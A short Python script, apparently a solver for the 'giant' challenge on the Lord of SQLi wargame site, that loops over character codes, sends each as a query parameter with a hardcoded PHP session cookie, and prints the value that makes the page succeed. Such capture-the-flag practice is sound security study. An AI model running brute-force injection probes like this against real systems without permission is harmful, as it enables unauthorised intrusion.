import requests

cookies={'PHPSESSID':'b61p6jj4h0n0rthn6uq0jjvdmr'}

for a in range(48,123):
    address="https://los.rubiya.kr/chall/giant_18a08c3be1d1753de0cb157703f75a5e.php"
    url=address+"?shit="+ascii(a)
    res=requests.get(url,cookies=cookies)

    if "giant" in res.text:
        print(ascii(a)+"정답")
        break
    else:
        print(ascii(a)+" : X")
